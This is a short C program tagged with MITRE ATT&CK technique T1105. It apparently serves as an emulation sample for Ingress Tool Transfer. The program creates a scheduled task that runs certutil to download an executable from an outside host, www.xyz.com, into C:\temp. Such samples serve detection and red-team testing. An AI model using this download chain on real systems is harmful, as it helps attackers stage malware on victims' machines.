// Link      = https://attack.mitre.org/techniques/T1105/
// Technique = Ingress Tool Transfer
// ID        = T1105.000
// Tactics   = Command and Control

#include <windows.h>

#define RUN(toRun) WinExec("schtasks /create /tn MyTask /tr \"cmd.exe /c \"" toRun "\" /sc once /st 00:00", SW_SHOW);

int main() {
    RUN("certutil -urlcache -split -f http://www.xyz.com/x.exe C:\\temp\\x.exe");
    return 0;
}